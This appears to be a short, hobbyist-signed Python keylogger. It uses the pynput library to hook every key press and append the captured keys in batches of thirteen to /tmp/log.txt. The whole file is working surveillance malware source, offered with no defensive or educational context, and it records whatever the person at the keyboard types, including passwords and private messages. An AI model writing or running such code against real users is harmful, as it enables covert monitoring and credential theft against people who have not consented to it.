#k4m1k4z13r wuz here
from pynput.keyboard import Key, Listener

count = 0
keys = []
def log(keys): #log the keys iteratively into a file
	with open('/tmp/log.txt','a') as f:
		for key in keys:
			f.write(str(key)+"\n")

def _pressed(key): #when a key is pressed
	global keys, count
	keys.append(key)
	count += 1
	if count >= 13: #if count equals or exceeds 13
		count = 0 #re-initialise the count variable
		log(keys) #log what you have
		keys = [] #re-initialise the keys list

def _released(key): #when a key is released
	pass #do nothing

with Listener(on_press=_pressed,on_release=_released) as listener:
	listener.join()
